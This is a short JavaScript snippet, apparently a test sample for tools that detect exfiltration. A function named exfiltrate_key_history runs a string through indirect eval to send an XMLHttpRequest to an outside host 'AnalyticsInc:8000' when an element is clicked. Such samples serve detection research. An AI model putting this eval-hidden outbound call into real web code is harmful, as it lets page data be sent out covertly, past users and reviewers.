function exfiltrate_key_history() {

    // Obfuscated Eval without obfuscated exp
    // Exfiltrate data using XMLHTTP request
    var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval1", true);xmlhttp.send(null);';
	(1,eval)(exp);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
